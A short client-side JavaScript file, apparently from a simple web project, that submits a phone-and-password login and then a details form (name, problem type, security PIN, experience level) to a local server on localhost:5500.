let currentPhone = "";

document.getElementById("loginForm").addEventListener("submit", async function (e) {

    e.preventDefault();

    const phone = document.getElementById("phone").value;
    const password = document.getElementById("password").value;

    currentPhone = phone;

    const response = await fetch("http://localhost:5500/login", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            phone,
            password
        })

    });

    const data = await response.json();

    alert(data.message);

    document.getElementById("loginForm").style.display = "none";
    document.getElementById("detailsForm").style.display = "block";

});

document.getElementById("detailsForm").addEventListener("submit", async function (e) {

    e.preventDefault();

    const pin = document.querySelectorAll(".pin");

    let securityPin = "";

    pin.forEach(input => {
        securityPin += input.value;
    });

    const response = await fetch("http://localhost:5500/details", {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({

            phone: currentPhone,

            fullName: document.getElementById("fullName").value,

            problemType: document.getElementById("problemType").value,

            securityPin: securityPin,

            experienceLevel: document.getElementById("experienceLevel").value

        })

    });

    const data = await response.json();

    alert(data.message);

});